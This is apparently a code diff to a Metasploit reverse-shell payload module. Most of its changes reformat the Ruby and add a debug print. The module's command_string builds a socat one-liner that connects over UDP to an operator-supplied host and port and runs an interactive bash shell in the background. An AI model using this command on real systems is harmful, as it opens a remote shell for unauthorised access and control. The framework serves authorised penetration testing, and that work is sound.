@@ -8,7 +8,6 @@ require 'msf/base/sessions/command_shell'
 require 'msf/base/sessions/command_shell_options'
 
 module MetasploitModule
-
   CachedSize = 87
 
   include Msf::Payload::Single
@@ -16,28 +15,28 @@ module MetasploitModule
 
   def initialize(info = {})
     super(merge_info(info,
-      'Name'          => 'Unix Command Shell, Reverse UDP (via socat)',
-      'Description'   => 'Creates an interactive shell via socat',
-      'Author'        => 'RageLtMan <rageltman[at]sempervictus>',
-      'License'       => MSF_LICENSE,
-      'Platform'      => 'unix',
-      'Arch'          => ARCH_CMD,
-      'Handler'       => Msf::Handler::ReverseUdp,
-      'Session'       => Msf::Sessions::CommandShell,
-      'PayloadType'   => 'cmd',
-      'RequiredCmd'   => 'socat',
-      'Payload'       =>
-        {
-          'Offsets' => { },
-          'Payload' => ''
-        }
-      ))
+                     'Name' => 'Unix Command Shell, Reverse UDP (via socat)',
+                     'Description' => 'Creates an interactive shell via socat',
+                     'Author' => 'RageLtMan <rageltman[at]sempervictus>',
+                     'License' => MSF_LICENSE,
+                     'Platform' => 'unix',
+                     'Arch' => ARCH_CMD,
+                     'Handler' => Msf::Handler::ReverseUdp,
+                     'Session' => Msf::Sessions::CommandShell,
+                     'PayloadType' => 'cmd',
+                     'RequiredCmd' => 'socat',
+                     'Payload' =>
+                       {
+                         'Offsets' => {},
+                         'Payload' => ''
+                       }))
   end
 
   #
   # Constructs the payload
   #
   def generate
+    vprint_good(command_string)
     return super + command_string
   end
 
@@ -47,5 +46,4 @@ module MetasploitModule
   def command_string
     "socat udp-connect:#{datastore['LHOST']}:#{datastore['LPORT']} exec:'bash -li',pty,stderr,sane 2>&1>/dev/null &"
   end
-
 end
